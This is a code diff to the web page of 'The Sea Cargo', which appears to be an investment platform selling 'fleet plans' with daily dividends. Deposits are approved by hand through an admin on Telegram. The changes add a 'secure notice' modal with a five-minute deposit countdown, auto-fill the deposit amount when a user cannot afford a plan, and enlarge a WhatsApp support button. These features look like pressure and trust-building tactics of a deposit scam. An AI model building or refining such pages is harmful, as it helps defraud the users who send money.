@@ -573,7 +573,7 @@
             <i class="fa-brands fa-whatsapp"></i>
           </div>
           <div>
-            <h4 class="text-xs font-black text-white uppercase tracking-wider">24/7 WhatsApp Help Desk</h4>
+            <h4 class="text-xs font-black text-white uppercase tracking-wider">24 Hours Support</h4>
             <p class="text-[10px] text-gray-400 font-mono mt-0.5">+91 96828-14718</p>
           </div>
         </div>
@@ -729,6 +729,30 @@
   </div>
 </div>
 
+<!-- CUSTOM LUXURY ALERT & 5-MIN TIMER MODAL -->
+<div id="customAlertModal" class="hidden fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4">
+  <div class="bg-gradient-to-b from-[#130d04] via-[#0a0f1d] to-[#050811] border-2 border-[#ffd000] rounded-3xl p-6 w-full max-w-sm space-y-4 text-center shadow-[0_0_40px_rgba(255,208,0,0.25)] relative overflow-hidden">
+    <div id="alertIconBox" class="w-16 h-16 mx-auto rounded-full bg-[#ffd000]/20 border-2 border-[#ffd000] flex items-center justify-center text-[#ffd000] text-2xl shadow-lg">
+      <i id="alertIcon" class="fa-solid fa-circle-check"></i>
+    </div>
+    <div>
+      <span class="text-[9px] font-black uppercase tracking-widest bg-[#ffd000]/20 text-[#ffd000] px-2.5 py-0.5 rounded-full border border-[#ffd000]/40">Terminal Secure Notice</span>
+      <h3 id="alertTitle" class="text-base font-black text-white tracking-wide uppercase font-luxury mt-2">Notification</h3>
+    </div>
+    <p id="alertDesc" class="text-gray-300 text-xs leading-relaxed">Message description...</p>
+    
+    <div id="depositTimerBox" class="hidden bg-[#030712] border border-orange-500/40 rounded-2xl p-3 space-y-1">
+      <span class="text-[9px] uppercase font-bold text-orange-400">Admin Verification Window</span>
+      <div id="countdownTimerText" class="text-xl font-black text-[#ffd000] font-mono">05:00</div>
+      <p class="text-[9px] text-gray-400">Funds will credit instantly once approved by Telegram Admin.</p>
+    </div>
+
+    <button onclick="closeModal('customAlertModal')" class="w-full bg-gradient-to-r from-[#ffd000] via-[#ff9800] to-[#ff6b00] text-black font-black py-3 rounded-xl text-xs active:scale-95 uppercase tracking-wider shadow-lg">
+      Understood & Proceed
+    </button>
+  </div>
+</div>
+
 <!-- ADMIN AUDIT DESK -->
 <div id="adminPanelModal" class="hidden fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4">
   <div class="bg-[#080d1a] border-2 border-[#00f589]/40 rounded-3xl p-5 w-full max-w-sm space-y-4 max-h-[85vh] overflow-y-auto shadow-2xl">
@@ -869,11 +893,47 @@
     }
   }
 
+  function showCustomAlert(title, desc, iconClass = "fa-circle-check", showTimer = false) {
+    document.getElementById("alertTitle").innerText = title;
+    document.getElementById("alertDesc").innerText = desc;
+    document.getElementById("alertIcon").className = `fa-solid ${iconClass}`;
+    
+    const timerBox = document.getElementById("depositTimerBox");
+    if (showTimer) {
+      timerBox.classList.remove("hidden");
+      startDepositCountdown(300); // 5 Minutes
+    } else {
+      timerBox.classList.add("hidden");
+    }
+    openModal("customAlertModal");
+  }
+
+  let depositInterval = null;
+  function startDepositCountdown(duration) {
+    clearInterval(depositInterval);
+    let timer = duration;
+    const display = document.getElementById("countdownTimerText");
+    depositInterval = setInterval(() => {
+      let minutes = parseInt(timer / 60, 10);
+      let seconds = parseInt(timer % 60, 10);
+      minutes = minutes < 10 ? "0" + minutes : minutes;
+      seconds = seconds < 10 ? "0" + seconds : seconds;
+      display.textContent = minutes + ":" + seconds;
+      if (--timer < 0) {
+        clearInterval(depositInterval);
+        display.textContent = "Time Expired / Refresh";
+      }
+    }, 1000);
+  }
+
+  // AUTO-FILLS EXACT PLAN PRICE IN DEPOSIT MODAL
   function buyFleetPlan(id) {
     const plan = FLEET_PLANS.find(p => p.id === id);
     if (!plan) return;
 
     if (state.balance < plan.price) {
+      const depInput = document.getElementById("depAmount");
+      if (depInput) depInput.value = plan.price;
       openModal('rechargeModal');
       return;
     }
@@ -901,7 +961,7 @@
     saveUserState();
     playTerminalChime('success');
     updateUI();
-    alert(`Allocated: ${plan.planNo}! 24H Dividend cycle activated.`);
+    showCustomAlert("Fleet Allocated Successfully!", `${plan.planNo} - ${plan.title} activated! 24H Dividend cycle live.`, "fa-ship");
   }
 </script>
 <script>
@@ -1220,7 +1280,9 @@
     playTerminalChime('success');
     closeModal('rechargeModal');
     updateUI();
-    alert("Deposit receipt sent to Admin Telegram! Balance will be added automatically once approved.");
+    
+    // Show Professional 5-Min Timer Modal
+    showCustomAlert("Deposit Under Review", "Receipt transmitted to Admin Telegram securely. Balance will credit automatically upon verification.", "fa-clock", true);
   }
 
   function adminApproveDeposit(id, silent = false) {
@@ -1636,10 +1698,16 @@
   });
 </script>
 
-<!-- 24/7 FLOATING WHATSAPP SUPPORT WIDGET -->
-<a href="https://wa.me/919682814718?text=Hello%20The%20Sea%20Cargo%20Support,%20I%20need%20assistance%20with%20my%20terminal%20account." target="_blank" class="fixed bottom-20 right-4 z-50 bg-[#25D366] text-white w-13 h-13 rounded-full flex items-center justify-center shadow-[0_6px_25px_rgba(37,211,102,0.6)] active:scale-95 transition animate-bounce">
-  <i class="fa-brands fa-whatsapp text-3xl"></i>
-</a>
+<!-- ENHANCED 24/7 WHATSAPP SUPPORT WIDGET -->
+<div class="fixed bottom-20 right-4 z-50 flex items-center gap-2">
+  <div class="bg-[#080d1a]/90 backdrop-blur-md border border-[#25D366]/50 px-3 py-1.5 rounded-2xl shadow-xl text-right">
+    <p class="text-[9px] font-black text-[#25D366] uppercase tracking-wider">24 Hours Support</p>
+    <p class="text-[8px] text-gray-300 font-mono">Instant Help Desk</p>
+  </div>
+  <a href="https://wa.me/919682814718?text=Hello%20The%20Sea%20Cargo%20Support,%20I%20need%20assistance%20with%20my%20terminal%20account." target="_blank" class="bg-[#25D366] text-black w-14 h-14 rounded-full flex items-center justify-center shadow-[0_8px_30px_rgba(37,211,102,0.7)] active:scale-95 transition animate-bounce">
+    <i class="fa-brands fa-whatsapp text-3xl font-black"></i>
+  </a>
+</div>
 
 </body>
 </html>
